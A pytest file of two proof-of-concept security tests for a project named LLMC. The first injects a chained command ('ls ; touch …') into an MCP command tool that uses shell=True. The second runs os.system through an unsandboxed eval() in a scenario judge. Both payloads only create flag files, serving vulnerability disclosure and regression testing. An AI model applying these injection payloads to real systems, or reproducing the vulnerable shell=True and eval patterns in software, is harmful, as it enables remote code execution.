"""
Security Proof-of-Concept Tests for LLMC.
"""
import os
import pytest
from pathlib import Path
from unittest.mock import MagicMock

# ==============================================================================
# PoC 1: Command Injection in llmc_mcp/tools/cmd.py
# ==============================================================================
def test_poc_mcp_command_injection(tmp_path):
    """
    VULNERABILITY: Command Injection in llmc_mcp.tools.cmd.run_cmd
    
    The validation logic splits the command and checks only the first token against a blacklist.
    If the first token is allowed (e.g., 'ls'), the rest of the command is executed.
    Since shell=True is used, we can chain commands with ';', '&&', or '|'.
    
    IMPACT: Remote Code Execution (RCE) on the MCP server.
    """
    from llmc_mcp.tools.cmd import run_cmd
    
    # Bypass isolation check for the test
    os.environ["LLMC_ISOLATED"] = "1"
    
    # Create a flag file to prove execution
    flag_file = tmp_path / "pwned.txt"
    assert not flag_file.exists()
    
    # The payload: "ls" is allowed (not in blacklist), but we chain "touch flag_file"
    # shell=True makes this work.
    payload = f"ls ; touch {flag_file}"
    
    result = run_cmd(
        command=payload,
        cwd=tmp_path,
        blacklist=[], # Empty blacklist as per default
        timeout=5
    )
    
    # Verify the exploit worked
    if flag_file.exists():
        print(f"\n[+] PoC Successful: Created {flag_file} via command injection!")
        print(f"    Stdout: {result.stdout}")
        print(f"    Stderr: {result.stderr}")
    else:
        print("\n[-] PoC Failed: Flag file not created.")
        
    assert flag_file.exists(), "Command injection failed to execute payload"

# ==============================================================================
# PoC 2: RCE in llmc/ruta/judge.py
# ==============================================================================
def test_poc_ruta_rce_via_eval(tmp_path):
    """
    VULNERABILITY: Arbitrary Code Execution in llmc.ruta.judge.Judge._check_metamorphic
    
    The Judge evaluates 'constraint' strings from Scenario objects using Python's eval().
    While it uses a custom context, it does not sanitize inputs or restrict __builtins__.
    
    IMPACT: Arbitrary Code Execution when running a malicious scenario file.
    """
    from llmc.ruta.judge import Judge
    from llmc.ruta.types import Scenario, Property, Expectations, TraceEvent
    
    # Create a flag file to prove execution
    flag_file = tmp_path / "ruta_pwned.txt"
    assert not flag_file.exists()
    
    # Malicious payload: execute python code to create the file
    # We use __import__('os') to get access to system commands
    payload_code = f"__import__('os').system('touch {flag_file}') == 0"
    
    # Construct a malicious Scenario
    malicious_scenario = MagicMock(spec=Scenario)
    malicious_scenario.id = "pwn-scenario"
    malicious_scenario.expectations = MagicMock(spec=Expectations)
    malicious_scenario.expectations.must_use_tools = []
    malicious_scenario.expectations.must_not_use_tools = []
    
    # The malicious property
    prop = MagicMock(spec=Property)
    prop.type = "metamorphic"
    prop.name = "exploit"
    prop.relation = None
    prop.constraint = payload_code
    
    malicious_scenario.expectations.properties = [prop]
    malicious_scenario.severity_policy = MagicMock()
    malicious_scenario.severity_policy.property_failures = {}
    
    # Create a dummy trace file
    trace_path = tmp_path / "trace.jsonl"
    trace_path.write_text('{"event": "start", "run_id": "test"}\n')
    
    # Run the Judge
    judge = Judge(malicious_scenario, trace_path)
    judge.evaluate()
    
    # Verify the exploit worked
    if flag_file.exists():
        print(f"\n[+] PoC Successful: Created {flag_file} via RUTA eval()!")
    else:
        print("\n[-] PoC Failed: Flag file not created.")
        
    assert flag_file.exists(), "RCE failed to execute payload"
